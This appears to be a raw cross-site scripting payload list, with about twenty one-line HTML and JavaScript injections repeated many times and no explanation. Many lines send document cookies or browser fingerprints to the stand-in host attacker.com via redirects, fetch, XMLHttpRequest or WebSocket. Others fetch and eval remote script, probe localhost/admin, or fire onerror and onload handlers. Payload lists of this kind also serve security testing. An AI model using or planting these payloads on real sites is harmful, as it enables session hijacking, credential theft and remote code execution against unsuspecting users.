<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
